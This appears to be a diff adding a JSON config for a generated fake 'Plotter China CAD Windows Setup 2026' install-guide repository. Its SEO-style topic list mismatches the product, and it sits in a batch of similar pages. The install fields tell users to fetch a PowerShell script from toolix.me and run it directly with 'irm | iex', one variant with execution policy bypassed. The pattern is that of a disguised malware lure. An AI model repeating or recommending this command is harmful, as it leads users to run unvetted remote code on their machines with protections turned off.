@@ -1,0 +1,27 @@
+{
+  "repo": "Plotter-China-CAD-Windows-Setup-2026",
+  "product": "Plotter China CAD Windows Setup 2026",
+  "product_title": "Plotter China CAD Windows",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-plotter-china-cad-windows",
+    "plotter-china-cad-windows-app",
+    "image-editing",
+    "creative-workflow",
+    "visual-design",
+    "design-software",
+    "plotter-china-cad-windows-windows-tool",
+    "plotter-china-cad-windows-modeling-tool",
+    "plotter-china-cad-windows-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
